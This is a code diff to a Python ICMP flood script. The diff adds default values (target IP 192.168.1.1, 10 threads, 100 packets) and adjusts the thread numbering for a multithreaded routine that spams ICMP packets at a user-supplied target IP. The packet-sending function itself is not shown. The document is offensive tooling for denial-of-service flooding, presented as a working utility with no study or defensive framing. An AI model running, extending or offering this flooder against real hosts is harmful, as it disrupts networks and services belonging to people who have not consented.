@@ -19,7 +19,7 @@ def icmp_flood(ip, threads, packets):
     thread_list = []
 
     for t in range(threads):
-        th = threading.Thread(target=icmp_spammer, args=(t, ip, packets))
+        th = threading.Thread(target=icmp_spammer, args=(t + 1, ip, packets))
         th.start()
         thread_list.append(th)
 
@@ -28,21 +28,26 @@ def icmp_flood(ip, threads, packets):
 
     print("\n[+] ICMP Flood Execution Completed.")
 
-def get_int(prompt, minimum=1):
+def get_int(prompt, default, minimum=1):
     while True:
         try:
-            val = int(input(prompt))
-            if val >= minimum:
-                return val
+            user_input = input(f"{prompt} default({default}): ").strip()
+            if not user_input:
+                return default
+            
+            if int(user_input) >= minimum:
+                return int(user_input)
+            
             print(f"Value must be >= {minimum}")
+
         except ValueError:
             print("Please enter a number.")
 
 if __name__ == "__main__":
     try:
-        target_ip = input("Target IP: ").strip()
-        num_threads = get_int("Threads: ", 1)
-        num_packets = get_int("Packets per thread: ", 1)
+        target_ip = input("Target IP: (default 192.168.1.1): ").strip() or "192.168.1.1"
+        num_threads = get_int("Threads: (default 10): ", default=10, minimum=1)
+        num_packets = get_int("Packets per thread: ", default=100, minimum=1)
 
         icmp_flood(target_ip, num_threads, num_packets)
 
